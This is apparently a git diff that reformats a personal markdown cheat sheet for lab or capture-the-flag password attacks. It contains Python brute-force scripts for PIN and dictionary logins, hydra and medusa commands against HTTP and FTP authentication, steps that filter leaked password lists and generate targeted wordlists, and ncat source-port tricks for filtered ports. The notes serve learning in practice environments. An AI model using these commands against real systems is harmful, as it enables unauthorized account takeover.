@@ -1,5 +1,7 @@
-# Bruteforce python 4 digits
+## Python coding
 
+### Bruteforce with 4 digits
+```python
 import requests
 
 ip = "127.0.0.1"  # Change this to your instance IP address
@@ -18,14 +20,10 @@ for pin in range(10000):
         print(f"Correct PIN found: {formatted_pin}")
         print(f"Flag: {response.json()['flag']}")
         break
+```
 
-
-
-
-------------------------------------------------------------------------------------------------------------------------------------------
-
-# Bruteforce python dictionary with only password
-
+### Bruteforce with dictionary with only password
+```python
 import requests
 
 ip = "127.0.0.1"  # Change this to your instance IP address
@@ -46,79 +44,88 @@ for password in passwords:
         print(f"Correct password found: {password}")
         print(f"Flag: {response.json()['flag']}")
         break
+```
 
+## Pen-testing
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Penetration
-
-
-
-
-# Basic http Auth
+### Basic http Auth
+```zsh
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt IP http-get / -s PORT
+```
 
-
-# Auth with a POST form 
+## Auth with a POST form 
+```zsh
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+```
 
-
-# FTP auth
+### FTP auth
+```zsh
 medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+```
 
+## Grepping for password policices
 
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
-# Grepping for password policices
-
-# Cut to 8 characters minimum
+### Cut to 8 characters minimum
+```zsh
 grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
+```
 
-# Enforces the policy's demand for at least one uppercase letter
+### Enforces the policy's demand for at least one uppercase letter
+```zsh
 grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
+```
 
-
-# Enforces the policy's demand for at least one lowercase letter
+### Enforces the policy's demand for at least one lowercase letter
+```zsh
 grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
+```
 
-
-# Enforces the policy's demand for at least one numerical digit
+### Enforces the policy's demand for at least one numerical digit
+```zsh
 grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
+```
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Wordlists
-
+## Wordlists
+```zsh
 curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
+```
 
+```zsh
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
+```
 
+```zsh
 curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+```
+
+## Generating custom wordlists 
+
+### Generating custom wordlists with username-anarchy 
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
-# Generating custom wordlists 
-
-
-
-
-
-# Generating custom wordlists with username-anarchy 
-
-
+```zsh
 sudo apt install ruby -y
+```
+
+```zsh
 git clone https://github.com/urbanadventurer/username-anarchy.git
+```
+
+```zsh
 cd username-anarchy
+```
 
+```zsh
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
+```
 
+## Generating custom wordlists with cupp
 
-# Generating custom wordlists with cupp
-
-
+```zsh
 sudo apt-get install -y cupp
+```
 
-
+```zsh
 cupp -i
 
 ___________
@@ -164,26 +171,39 @@ ___________
 [+] Sorting list and removing duplicates...
 [+] Saving dictionary to jane.txt, counting 46790 words.
 [+] Now load your pistolero with jane.txt and shoot! Good luck!
+```
 
 
+## Commands for testing access and some other useful ones
 
+### Connect with SSH
 
-
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
-# Commands for testing access and some other useful ones
-
-
-
-# Connect with SSH
+```zsh
 ssh sshuser@<IP> -p PORT
+```
 
-# Connect to FTP
+### Connect to FTP
+
+```zsh
 ftp ftp://<FTP_USERNAME>:<FTPUSER_PASSWORD>@localhost
+```
 
+### List active ports
 
-# List active ports
+```zsh
 netstat -tulpn | grep LISTEN
+```
+
+```zsh
 nmap localhost
+```
+
+### Connect to address with specific port
+```zsh
+ncat -nv IP:PORT
+```
+
+### Connect to address with specific filtered port
+```zsh
+ncat -nv --source-port <DNS_SERVER_PORT> IP:PORT
+```
